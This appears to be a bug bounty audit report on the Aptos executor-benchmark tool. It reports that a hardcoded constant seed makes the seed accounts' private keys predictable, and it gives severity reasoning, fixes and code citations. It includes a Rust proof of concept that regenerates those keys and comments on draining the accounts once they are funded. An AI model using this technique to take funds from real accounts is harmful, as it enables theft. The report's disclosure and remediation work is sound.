# Audit Report

## Title
Predictable Seed Account Generation Due to Hardcoded Constant Seed Enables Account Draining

## Summary
Seed accounts in the executor-benchmark tool are generated using a hardcoded constant seed (`u64::MAX`), making their private keys and addresses completely predictable. An attacker can pre-compute these accounts and drain their funds when the benchmark tool is executed on any network.

## Finding Description

The `gen_seed_account_cache()` function generates seed accounts through the `AccountGenerator::new_for_seed_accounts()` method, which uses a hardcoded constant seed value. [1](#0-0) 

This constant seed is used to initialize a deterministic random number generator: [2](#0-1) 

The seed accounts receive substantial balances (10,000x the intended account balance) during benchmark execution: [3](#0-2) [4](#0-3) 

**Attack Path:**
1. Attacker runs identical code locally to generate the same seed accounts and obtains their private keys
2. Attacker monitors for benchmark execution on testnet or other networks
3. When seed accounts are funded via transactions, attacker immediately submits competing transactions to drain the accounts
4. Attacker successfully steals funds before they can be used for their intended purpose

The vulnerability breaks the security assumption that account private keys should be unpredictable. While seed account generation uses cryptographically secure RNG functions, the zero-entropy seed makes the entire process deterministic.

## Impact Explanation

This qualifies as **Medium severity** under the Aptos Bug Bounty Program criteria: "Limited funds loss or manipulation."

While the executor-benchmark tool is designed for testing/benchmarking environments, it can be executed on testnet or other networks where tokens may have value (for trading, testing, or other purposes). The predictable seed accounts create an exploitable attack surface where:

- Seed accounts holding `init_account_balance * 10,000` tokens can be drained
- For 100,000 new accounts with 100 token balance each, seed accounts would hold 1,000,000 tokens total
- Benchmark operations would fail, requiring re-funding and re-execution
- Pattern could be inadvertently copied to production code

## Likelihood Explanation

**Likelihood: Medium**

The vulnerability is easily exploitable if:
- The benchmark tool is run on testnet (common for performance validation)
- Testnet tokens have any value or utility
- An attacker monitors testnet mempool/transactions
- The attacker has basic knowledge of the codebase

The attack requires minimal sophistication - simply running the same account generation code and monitoring for funding transactions. The completely predictable nature (zero entropy) makes exploitation trivial.

## Recommendation

Replace the hardcoded constant seed with a cryptographically secure random seed. Modify the account generator to use entropy from the system's secure random source:

```rust
pub fn new_for_seed_accounts(is_keyless: bool) -> Self {
    // Use secure random seed instead of hardcoded constant
    let mut seed_bytes = [0u8; 32];
    rand::thread_rng().fill(&mut seed_bytes);
    let root_seed = u64::from_le_bytes(seed_bytes[0..8].try_into().unwrap());
    Self::new(root_seed, 0, is_keyless)
}
```

Alternatively, accept a seed parameter from the caller and require explicit acknowledgment when using deterministic seeds:

```rust
pub fn new_for_seed_accounts(is_keyless: bool, seed: Option<u64>) -> Self {
    let root_seed = seed.unwrap_or_else(|| {
        // Generate secure random seed if none provided
        let mut rng = rand::thread_rng();
        rng.gen::<u64>()
    });
    Self::new(root_seed, 0, is_keyless)
}
```

## Proof of Concept

```rust
use rand::{rngs::StdRng, SeedableRng};
use aptos_sdk::types::LocalAccount;

// Attacker's code to pre-compute seed accounts
fn exploit_predictable_seeds() {
    const SEED_ACCOUNTS_ROOT_SEED: u64 = u64::MAX;
    const MAX_ACCOUNT_GEN_PER_RNG: u64 = 40000;
    
    // Step 1: Generate the same seed accounts as the benchmark tool
    let mut root_rng = StdRng::seed_from_u64(SEED_ACCOUNTS_ROOT_SEED);
    let mut active_rng = StdRng::seed_from_u64(root_rng.next_u64());
    
    // Generate first 100 seed accounts (matching typical benchmark)
    let mut stolen_accounts = Vec::new();
    for i in 0..100 {
        let account = LocalAccount::generate_for_testing(&mut active_rng, false);
        println!("Seed Account {}: {:?}", i, account.address());
        println!("  Private key controlled by attacker!");
        stolen_accounts.push(account);
    }
    
    // Step 2: Attacker waits for these accounts to be funded on testnet
    // Step 3: Attacker submits transactions to drain funds immediately
    println!("\n[EXPLOIT] Attacker has private keys for all {} seed accounts", stolen_accounts.len());
    println!("[EXPLOIT] When benchmark funds these accounts, attacker can drain them instantly");
}

#[test]
fn demonstrate_seed_predictability() {
    exploit_predictable_seeds();
    
    // Verify determinism: running again produces identical accounts
    let first_run = {
        let mut root_rng = StdRng::seed_from_u64(u64::MAX);
        let mut active_rng = StdRng::seed_from_u64(root_rng.next_u64());
        LocalAccount::generate_for_testing(&mut active_rng, false).address()
    };
    
    let second_run = {
        let mut root_rng = StdRng::seed_from_u64(u64::MAX);
        let mut active_rng = StdRng::seed_from_u64(root_rng.next_u64());
        LocalAccount::generate_for_testing(&mut active_rng, false).address()
    };
    
    assert_eq!(first_run, second_run, "Seed accounts are deterministic!");
}
```

**Notes**

While the executor-benchmark tool is intended for controlled testing environments, the use of a hardcoded constant seed represents a fundamental security flaw. The complete absence of entropy violates cryptographic best practices and creates an unnecessary attack surface. Even in testing contexts, predictable private keys should be explicitly acknowledged and isolated from any environment where tokens might have value.

The deterministic behavior may have been intentional for reproducible benchmarks, but this should be achieved through explicit seed parameters with warnings, not hardcoded constants that apply universally.

### Citations

**File:** execution/executor-benchmark/src/account_generator.rs (L17-22)
```rust
    const SEED_ACCOUNTS_ROOT_SEED: u64 = u64::MAX;
    const USER_ACCOUNTS_ROOT_SEED: u64 = 0;

    pub fn new_for_seed_accounts(is_keyless: bool) -> Self {
        Self::new(Self::SEED_ACCOUNTS_ROOT_SEED, 0, is_keyless)
    }
```

**File:** execution/executor-benchmark/src/account_generator.rs (L28-36)
```rust
    fn new(root_seed: u64, num_to_skip: u64, is_keyless: bool) -> Self {
        let mut root_rng = StdRng::seed_from_u64(root_seed);
        let num_rngs_to_skip = num_to_skip / Self::MAX_ACCOUNT_GEN_PER_RNG;
        for _ in 0..num_rngs_to_skip {
            root_rng.next_u64();
        }
        let active_rng_to_skip = num_to_skip % Self::MAX_ACCOUNT_GEN_PER_RNG;
        let mut active_rng_quota = Self::MAX_ACCOUNT_GEN_PER_RNG - active_rng_to_skip;
        let mut active_rng = StdRng::seed_from_u64(root_rng.next_u64());
```

**File:** execution/executor-benchmark/src/transaction_generator.rs (L376-384)
```rust
        // Ensure that seed accounts have enough balance to transfer money to at least 10000 account with
        // balance init_account_balance.
        self.create_seed_accounts(
            reader,
            num_new_accounts,
            block_size,
            init_account_balance * 10_000,
            is_keyless,
        );
```

**File:** execution/executor-benchmark/src/transaction_generator.rs (L464-476)
```rust
    pub fn create_seed_accounts(
        &mut self,
        reader: Arc<dyn DbReader>,
        num_new_accounts: usize,
        block_size: usize,
        seed_account_balance: u64,
        is_keyless: bool,
    ) {
        // We don't store the # of existing seed accounts now. Thus here we just blindly re-create
        // and re-mint seed accounts here.
        let num_seed_accounts = (num_new_accounts / 1000).clamp(1, 100000);
        let seed_accounts_cache =
            Self::gen_seed_account_cache(reader.clone(), num_seed_accounts, is_keyless);
```
